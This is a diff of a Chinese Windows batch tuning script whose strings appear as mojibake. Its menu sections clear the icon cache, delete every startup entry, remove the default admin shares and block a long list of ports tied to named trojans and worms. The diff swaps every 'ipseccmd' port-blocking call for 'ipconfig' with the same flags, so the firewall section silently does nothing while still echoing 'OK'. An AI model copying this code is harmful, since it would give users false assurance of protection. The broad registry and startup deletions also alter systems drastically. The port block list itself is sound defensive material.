@@ -751,8 +751,8 @@ exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
 
 :mark11
 cls
-title »Ö¸´Ğ¡À®°ÈÍ¼±ê
-echo. ¿ªÊ¼»Ö¸´Ğ¡À®°ÈÍ¼±ê
+title æ¢å¤å°å–‡å­å›¾æ ‡
+echo. å¼€å§‹æ¢å¤å°å–‡å­å›¾æ ‡
 
 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TrayNotify" /f /v "PastIconsStream" 
 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TrayNotify" /f /v "IconStreams" 
@@ -769,11 +769,11 @@ reg add "HKLM\SYSTEM\CurrentControlSet\Services\SSDPSRV" /f /v "Start" /t REG_DW
 reg add "HKLM\SYSTEM\CurrentControlSet\Services\Nla" /f /v "Start" /t REG_DWORD /d 2
 reg add "HKLM\SYSTEM\CurrentControlSet\Services\Netman" /f /v "Start" /t REG_DWORD /d 2
 
-echo. »Ö¸´Ğ¡À®°ÈÍ¼±êÍê³É
-echo. Çë°´ÈÎÒâ¼ü·µ»ØÉÏÒ»²ã¡­¡­
+echo. æ¢å¤å°å–‡å­å›¾æ ‡å®Œæˆ
+echo. è¯·æŒ‰ä»»æ„é”®è¿”å›ä¸Šä¸€å±‚â€¦â€¦
 pause >nul
 goto mark0
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 
 
@@ -782,28 +782,28 @@ exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
 
 :mark12
 cls
-title È¥³ıÍ¼±êµÄ¶ÜÅÆ
-echo. È·¶¨uac¹Ø±Õ  ¾ÍÊÇÓÃ»§ÕË»§¿ØÖÆ¡£
-echo. È·¶¨(1)   ·µ»ØÉÏÒ»²ã(0)
-set /p m=        ÇëÑ¡Ôñ¶ÔÓ¦µÄÏîÄ¿ °´enter¼üÈ·¶¨:
+title å»é™¤å›¾æ ‡çš„ç›¾ç‰Œ
+echo. ç¡®å®šuacå…³é—­  å°±æ˜¯ç”¨æˆ·è´¦æˆ·æ§åˆ¶ã€‚
+echo. ç¡®å®š(1)   è¿”å›ä¸Šä¸€å±‚(0)
+set /p m=        è¯·é€‰æ‹©å¯¹åº”çš„é¡¹ç›® æŒ‰enteré”®ç¡®å®š:
 
 if /i "%m%"=="1" goto mark12.1
 if /i "%m%"=="0" goto mark0
 
 :mark12.1
 
-echo. ¿ªÊ¼È¥³ıÍ¼±êµÄ¶ÜÅÆ
+echo. å¼€å§‹å»é™¤å›¾æ ‡çš„ç›¾ç‰Œ
 
 taskkill /f /im explorer.exe
 attrib -s -r -h "%userprofile%\AppData\Local\iconcache.db"
 del "%userprofile%\AppData\Local\iconcache.db" /f /q
-start explorer¡¡¡¡
+start explorerã€€ã€€
 
-echo. È¥³ıÍ¼±êµÄ¶ÜÅÆÍê³É
-echo. Çë°´ÈÎÒâ¼ü·µ»ØÉÏÒ»²ã¡­¡­
+echo. å»é™¤å›¾æ ‡çš„ç›¾ç‰Œå®Œæˆ
+echo. è¯·æŒ‰ä»»æ„é”®è¿”å›ä¸Šä¸€å±‚â€¦â€¦
 pause >nul
 goto mark0
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 
 
@@ -813,24 +813,24 @@ exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
 :mark13
 
 cls
-title ÏÔÊ¾×Ô¼ºµÄIP 
+title æ˜¾ç¤ºè‡ªå·±çš„IP 
 
 for /f "tokens=15" %%i in ('ipconfig ^| find /i "ip address"') do set ip=%%i
 echo %ip%
 
-echo. Çë°´ÈÎÒâ¼ü·µ»ØÉÏÒ»²ã¡­¡­
+echo. è¯·æŒ‰ä»»æ„é”®è¿”å›ä¸Šä¸€å±‚â€¦â€¦
 pause >nul
 goto mark0
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 
 
 
 :mark14
 
-title Çå³ı¶àÓàµÄÓÒ¼ü²Ëµ¥Ñ¡Ïî
+title æ¸…é™¤å¤šä½™çš„å³é”®èœå•é€‰é¡¹
 cls
-echo.²¿·Ö²»ÄÜÇå³ıµÄ×Ô¼ºÈ¥°Ù¶È°É¡£
+echo.éƒ¨åˆ†ä¸èƒ½æ¸…é™¤çš„è‡ªå·±å»ç™¾åº¦å§ã€‚
 pause
 
 regsvr32 /u /s igfxpph.dll
@@ -839,10 +839,10 @@ reg add HKEY_CLASSES_ROOT\Directory\Background\shellex\ContextMenuHandlers\new /
 reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v HotKeysCmds /f
 reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v IgfxTray /f
 
-echo Çå³ı³É¹¦£¬Çë°´ÈÎÒâ¼ü·µ»ØÉÏÒ»²ã¡­¡­
+echo æ¸…é™¤æˆåŠŸï¼Œè¯·æŒ‰ä»»æ„é”®è¿”å›ä¸Šä¸€å±‚â€¦â€¦
 pause >nul
 goto mark0
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 
 
@@ -852,16 +852,16 @@ exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
 
 :mark15
 
-title Çå³ı¶àÓàµÄÆô¶¯ÏîÄ¿ 
+title æ¸…é™¤å¤šä½™çš„å¯åŠ¨é¡¹ç›® 
 cls
-echo.    ±¾Åú´¦Àí»á×Ô¶¯ÇåÀíËùÓĞ·Ç±ØÒªµÄÆô¶¯ÏîÄ¿£¬ÇåÀíÇ°»á°Ñ
-echo.    Ô­Æô¶¯ÏîÄ¿±¸·İ£¬±£´æÎªc:\windows\±¸·İµÄÆô¶¯ÏîÄ¿.r
-echo.    eg£¬ÈôĞèÒªÇëË«»÷µ¼Èë¼´¿É¡£
+echo.    æœ¬æ‰¹å¤„ç†ä¼šè‡ªåŠ¨æ¸…ç†æ‰€æœ‰éå¿…è¦çš„å¯åŠ¨é¡¹ç›®ï¼Œæ¸…ç†å‰ä¼šæŠŠ
+echo.    åŸå¯åŠ¨é¡¹ç›®å¤‡ä»½ï¼Œä¿å­˜ä¸ºc:\windows\å¤‡ä»½çš„å¯åŠ¨é¡¹ç›®.r
+echo.    egï¼Œè‹¥éœ€è¦è¯·åŒå‡»å¯¼å…¥å³å¯ã€‚
 pause
 reg export HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run c:\windows\1.reg
 reg export HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run c:\windows\2.reg
-type c:\windows\1.reg >> c:\windows\±¸·İµÄÆô¶¯ÏîÄ¿.reg
-type c:\windows\2.reg >> c:\windows\±¸·İµÄÆô¶¯ÏîÄ¿.reg
+type c:\windows\1.reg >> c:\windows\å¤‡ä»½çš„å¯åŠ¨é¡¹ç›®.reg
+type c:\windows\2.reg >> c:\windows\å¤‡ä»½çš„å¯åŠ¨é¡¹ç›®.reg
 Del c:\windows\1.reg
 Del c:\windows\2.reg
 reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /va /f
@@ -890,14 +890,14 @@ reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync" /v item /d TINTSETP
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync" /v key /d SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 
-Del "C:\Documents and Settings\All Users\¡¸¿ªÊ¼¡¹²Ëµ¥\³ÌĞò\Æô¶¯\*.*" /q /f
-Del "C:\Documents and Settings\Default User\¡¸¿ªÊ¼¡¹²Ëµ¥\³ÌĞò\Æô¶¯\*.*" /q /f
-Del "%userprofile%\¡¸¿ªÊ¼¡¹²Ëµ¥\³ÌĞò\Æô¶¯\*.*" /q /f
+Del "C:\Documents and Settings\All Users\ã€Œå¼€å§‹ã€èœå•\ç¨‹åº\å¯åŠ¨\*.*" /q /f
+Del "C:\Documents and Settings\Default User\ã€Œå¼€å§‹ã€èœå•\ç¨‹åº\å¯åŠ¨\*.*" /q /f
+Del "%userprofile%\ã€Œå¼€å§‹ã€èœå•\ç¨‹åº\å¯åŠ¨\*.*" /q /f
 start C:\WINDOWS\pchealth\helpctr\binaries\msconfig.exe
-echo Çå³ı³É¹¦£¬Çë°´ÈÎÒâ¼ü·µ»ØÉÏÒ»²ã¡­¡­
+echo æ¸…é™¤æˆåŠŸï¼Œè¯·æŒ‰ä»»æ„é”®è¿”å›ä¸Šä¸€å±‚â€¦â€¦
 pause >nul
 goto mark0
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 
 
@@ -906,48 +906,48 @@ exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
 
 :mark16
 cls
-title É¾³ıÄ¬ÈÏ¹²Ïí
+title åˆ é™¤é»˜è®¤å…±äº«
 echo. 
 echo ------------------------------------------------------ 
 echo. 
-echo ¿ªÊ¼É¾³ıÃ¿¸ö·ÖÇøÏÂµÄÄ¬ÈÏ¹²Ïí. 
+echo å¼€å§‹åˆ é™¤æ¯ä¸ªåˆ†åŒºä¸‹çš„é»˜è®¤å…±äº«. 
 echo. 
 for %%a in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do @(
     if exist %%a:\nul (
-        net share %%a$ /delete>nul 2>nul && echo ³É¹¦É¾³ıÃûÎª %%a$ µÄÄ¬ÈÏ¹²Ïí || echo ÃûÎª %%a$ µÄÄ¬ÈÏ¹²Ïí²»´æÔÚ
+        net share %%a$ /delete>nul 2>nul && echo æˆåŠŸåˆ é™¤åä¸º %%a$ çš„é»˜è®¤å…±äº« || echo åä¸º %%a$ çš„é»˜è®¤å…±äº«ä¸å­˜åœ¨
     ) 
 )
-net share admin$ /delete>nul 2>nul && echo ³É¹¦É¾³ıÃûÎª admin$ µÄÄ¬ÈÏ¹²Ïí || echo ÃûÎª admin$ µÄÄ¬ÈÏ¹²Ïí²»´æÔÚ
+net share admin$ /delete>nul 2>nul && echo æˆåŠŸåˆ é™¤åä¸º admin$ çš„é»˜è®¤å…±äº« || echo åä¸º admin$ çš„é»˜è®¤å…±äº«ä¸å­˜åœ¨
 echo.
 echo ------------------------------------------------------ 
 echo.
-net stop Server>nul 2>nul && echo Server·şÎñÒÑÍ£Ö¹.
-net start Server>nul 2>nul && echo Server·şÎñÒÑÆô¶¯.
+net stop Server>nul 2>nul && echo ServeræœåŠ¡å·²åœæ­¢.
+net start Server>nul 2>nul && echo ServeræœåŠ¡å·²å¯åŠ¨.
 echo. 
 echo ------------------------------------------------------ 
 echo. 
-echo ĞŞ¸Ä×¢²á±íÒÔ¸ü¸ÄÏµÍ³Ä¬ÈÏÉèÖÃ. 
+echo ä¿®æ”¹æ³¨å†Œè¡¨ä»¥æ›´æ”¹ç³»ç»Ÿé»˜è®¤è®¾ç½®. 
 echo. 
-echo ÕıÔÚ´´½¨×¢²á±íÎÄ¼ş. 
+echo æ­£åœ¨åˆ›å»ºæ³¨å†Œè¡¨æ–‡ä»¶. 
 echo Windows Registry Editor Version 5.00> c:\delshare.reg 
-:: Í¨¹ı×¢²á±í½ûÖ¹Admin$¹²Ïí£¬ÒÔ·ÀÖØÆôºóÔÙ´Î¼ÓÔØ
+:: é€šè¿‡æ³¨å†Œè¡¨ç¦æ­¢Admin$å…±äº«ï¼Œä»¥é˜²é‡å¯åå†æ¬¡åŠ è½½
 echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters]>> c:\delshare.reg
 echo "AutoShareWks"=dword:00000000>> c:\delshare.reg 
 echo "AutoShareServer"=dword:00000000>> c:\delshare.reg 
-:: É¾³ıIPC$¹²Ïí£¬±¾¹¦ÄÜĞèÒªadministritorÈ¨ÏŞ²ÅÄÜ³É¹¦É¾³ı
+:: åˆ é™¤IPC$å…±äº«ï¼Œæœ¬åŠŸèƒ½éœ€è¦administritoræƒé™æ‰èƒ½æˆåŠŸåˆ é™¤
 echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa]>> c:\delshare.reg
 echo "restrictanonymous"=dword:00000001>> c:\delshare.reg
-echo ÕıÔÚµ¼Èë×¢²á±íÎÄ¼şÒÔ¸ü¸ÄÏµÍ³Ä¬ÈÏÉèÖÃ. 
+echo æ­£åœ¨å¯¼å…¥æ³¨å†Œè¡¨æ–‡ä»¶ä»¥æ›´æ”¹ç³»ç»Ÿé»˜è®¤è®¾ç½®. 
 regedit /s c:\delshare.reg 
-del c:\delshare.reg && echo ÁÙÊ±ÎÄ¼şÒÑ¾­É¾³ı. 
+del c:\delshare.reg && echo ä¸´æ—¶æ–‡ä»¶å·²ç»åˆ é™¤. 
 echo. 
 echo ------------------------------------------------------ 
 echo. 
-echo ³ÌĞòÒÑ¾­³É¹¦É¾³ıËùÓĞµÄÄ¬ÈÏ¹²Ïí. 
+echo ç¨‹åºå·²ç»æˆåŠŸåˆ é™¤æ‰€æœ‰çš„é»˜è®¤å…±äº«. 
 echo. 
 pause>nul
 goto mark0
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 
 
@@ -958,330 +958,330 @@ exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
 :mark17
 
 cls
-title Ä¾Âí¶Ë¿Ú·âÉ±
-echo. ¿ªÊ¼Ä¾Âí¶Ë¿Ú·âÉ±
+title æœ¨é©¬ç«¯å£å°æ€
+echo. å¼€å§‹æœ¨é©¬ç«¯å£å°æ€
 pause
 
 gpupdate >nul
 rem For Client only
-ipseccmd -w REG -p "HFUT_SECU" -o -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -x >nul
-rem ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/80" -f *+0:80:TCP -n BLOCK -x >nul
-rem ipseccmd -w REG -p "HFUT_SECU" -r "Block UDP/1434" -f *+0:1434:UDP -n BLOCK -x >nul
-rem ipseccmd -w REG -p "HFUT_SECU" -r "Block UDP/137" -f *+0:137:UDP -n BLOCK -x >nul
-rem ipseccmd -w REG -p "HFUT_SECU" -r "Block UDP/138" -f *+0:138:UDP -n BLOCK -x >nul
-rem echo ½ûÖ¹ÍøÉÏÁÚ¾ÓµÄÎÄ¼ş´«Êä£¨È¥µôÉÏÊöÁ½ĞĞµÄ REM ¼´¿ÉÉúĞ§£¡£©
-rem ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/139" -f *+0:139:TCP -n BLOCK -x >nul 
-rem echo ½ûÖ¹NetBIOS/SMB·şÎñºÍÎÄ¼şºÍ´òÓ¡»ú¹²ÏíºÍSAMBA£¨È¥µôREMÉúĞ§£©
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/135" -f *+0:135:TCP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block UDP/135" -f *+0:135:UDP -n BLOCK -x >nul
-echo ½ûÖ¹Location Service·şÎñºÍ·ÀÖ¹ Dos ¹¥»÷¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/445" -f *+0:445:TCP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block UDP/445" -f *+0:445:UDP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1025" -f *+0:1025:TCP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block UDP/139" -f *+0:139:UDP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1068" -f *+0:1068:TCP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5554" -f *+0:5554:TCP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9995" -f *+0:9995:TCP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9996" -f *+0:9996:TCP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6129" -f *+0:6129:TCP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block ICMP/255" -f *+0:255:ICMP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/43958" -f *+0:43958:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÁ÷ĞĞÎ£ÏÕ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/20034" -f *+0:20034:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíNetBus Pro¿ª·ÅµÄ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1092" -f *+0:1092:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÈä³æLoveGate¿ª·ÅµÄ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/3996" -f *+0:3996:TCP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4060" -f *+0:4060:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíRemoteAnything¿ª·ÅµÄ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4590" -f *+0:4590:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíICQTrojan¿ª·ÅµÄ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1080" -f *+0:1080:TCP -n BLOCK -x >nul
-echo ½ûÖ¹´úÀí·şÎñÆ÷É¨Ãè¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/113" -f *+0:113:TCP -n BLOCK -x >nul
-echo ½ûÖ¹Authentication Service·şÎñ¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/79" -f *+0:79:TCP -n BLOCK -x >nul
-echo ½ûÖ¹FingerÉ¨Ãè¡­¡­¡­¡­OK£¡
-ipseccmd -w REG -p "HFUT_SECU" -r "Block UDP/53" -f *+0:53:UDP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/53" -f *+0:53:TCP -n BLOCK -x >nul
-echo ½ûÖ¹ÇøÓò´«µİ£¨TCP£©£¬ÆÛÆ­DNS£¨UDP£©»òÒş²ØÆäËûµÄÍ¨ĞÅ¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/707" -f *+0:707:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕnachiÈä³æ²¡¶¾¼àÌı¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/808" -f *+0:808:TCP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23" -f *+0:23:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕTelnet ºÍÄ¾ÂíTiny Telnet Server¼àÌı¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/520" -f *+0:520:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕRip ¶Ë¿Ú¡­¡­¡­¡­OK£¡
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1999" -f *+0:1999:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾Âí³ÌĞòBackDoorµÄÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK£¡
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2001" -f *+0:2001:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÂí³ÌĞòºÚ¶´2001µÄÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2023" -f *+0:2023:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾Âí³ÌĞòRipperµÄÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2583" -f *+0:2583:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾Âí³ÌĞòWincrash v2µÄÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK£¡
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/3389" -f *+0:3389:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕWindows µÄÔ¶³Ì¹ÜÀíÖÕ¶Ë£¨Ô¶³Ì×ÀÃæ£©¼àÌı¶Ë¿Ú¡­¡­¡­¡­OK£¡
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4444" -f *+0:4444:TCP -n BLOCK -x >nul
-echo ¹Ø±Õmsblast³å»÷²¨Èä³æ¼àÌı¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/4899" -f *+0:4899:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÔ¶³Ì¿ØÖÆÈí¼ş£¨remote administrator)·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5800" -f *+0:5800:TCP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5900" -f *+0:5900:TCP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/8888" -f *+0:8888:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÔ¶³Ì¿ØÖÆÈí¼şVNCµÄÁ½¸öÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6129" -f *+0:6129:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕDameware·şÎñ¶ËÄ¬ÈÏ¼àÌı¶Ë¿Ú£¨¿É±ä£¡£©¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6267" -f *+0:6267:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾Âí¹ãÍâÅ®ÉúµÄÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/660" -f *+0:660:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíDeepThroat v1.0 - 3.1Ä¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6671" -f *+0:6671:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíIndoctrinationÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6939" -f *+0:6939:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíPRIORITYÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíÍøÂç¾«ÁéÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7511" -f *+0:7511:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾Âí´ÏÃ÷»ùÒòµÄÄ¬ÈÏÁ¬½Ó¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7626" -f *+0:7626:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾Âí±ùºÓÄ¬ÈÏ¶Ë¿Ú(×¢Òâ¿É±ä£¡)¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/8011" -f *+0:8011:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíWAY2.4Ä¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK£¡
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9989" -f *+0:9989:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíInIkillerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/19191" -f *+0:19191:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíÀ¼É«»ğÑæÄ¬ÈÏ¿ª·ÅµÄtelnet¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1029" -f *+0:1029:TCP -n BLOCK -x >nul
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/20168" -f *+0:20168:TCP -n BLOCK -x >nul
-echo ¹Ø±Õlovegate Èä³æËù¿ª·ÅµÄÁ½¸öºóÃÅ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23444" -f *+0:23444:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíÍøÂç¹«Å£Ä¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/27374" -f *+0:27374:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíSUB7Ä¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30100" -f *+0:30100:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíNetSphereÄ¬ÈÏµÄ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/31337" -f *+0:31337:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíBO2000Ä¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/45576" -f *+0:45576:TCP -n BLOCK -x >nul
-echo ¹Ø±Õ´úÀíÈí¼şµÄ¿ØÖÆ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/50766" -f *+0:50766:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíSchwindlerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/61466" -f *+0:61466:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíTelecommandoÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
+ipconfig -w REG -p "HFUT_SECU" -o -x >nul
+ipconfig -w REG -p "HFUT_SECU" -x >nul
+rem ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/80" -f *+0:80:TCP -n BLOCK -x >nul
+rem ipconfig -w REG -p "HFUT_SECU" -r "Block UDP/1434" -f *+0:1434:UDP -n BLOCK -x >nul
+rem ipconfig -w REG -p "HFUT_SECU" -r "Block UDP/137" -f *+0:137:UDP -n BLOCK -x >nul
+rem ipconfig -w REG -p "HFUT_SECU" -r "Block UDP/138" -f *+0:138:UDP -n BLOCK -x >nul
+rem echo ç¦æ­¢ç½‘ä¸Šé‚»å±…çš„æ–‡ä»¶ä¼ è¾“ï¼ˆå»æ‰ä¸Šè¿°ä¸¤è¡Œçš„ REM å³å¯ç”Ÿæ•ˆï¼ï¼‰
+rem ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/139" -f *+0:139:TCP -n BLOCK -x >nul 
+rem echo ç¦æ­¢NetBIOS/SMBæœåŠ¡å’Œæ–‡ä»¶å’Œæ‰“å°æœºå…±äº«å’ŒSAMBAï¼ˆå»æ‰REMç”Ÿæ•ˆï¼‰
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/135" -f *+0:135:TCP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block UDP/135" -f *+0:135:UDP -n BLOCK -x >nul
+echo ç¦æ­¢Location ServiceæœåŠ¡å’Œé˜²æ­¢ Dos æ”»å‡»â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/445" -f *+0:445:TCP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block UDP/445" -f *+0:445:UDP -n BLOCK -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1025" -f *+0:1025:TCP -n BLOCK -x >nul
